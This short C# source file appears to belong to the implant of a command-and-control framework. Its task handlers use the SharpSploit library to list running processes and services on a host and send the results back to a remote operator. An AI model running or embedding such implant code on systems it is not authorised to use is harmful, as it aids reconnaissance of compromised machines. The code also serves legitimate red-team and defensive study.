using System.Threading;

using Drone.Models;

namespace StandardModule;

public partial class StandardApi
{
    private void GetProcessListing(DroneTask task, CancellationToken token)
    {
        var result = SharpSploit.Enumeration.Host.GetProcessListing();
        Drone.SendResult(task.TaskGuid, result.ToString());
    }

    private void ListServices(DroneTask task, CancellationToken token)
    {
        var computerName = string.Empty;
        if (task.Arguments.Length > 0) computerName = task.Arguments[0];

        var result = SharpSploit.Enumeration.Host.GetServiceListing(computerName);
        Drone.SendResult(task.TaskGuid, result.ToString());
    }
}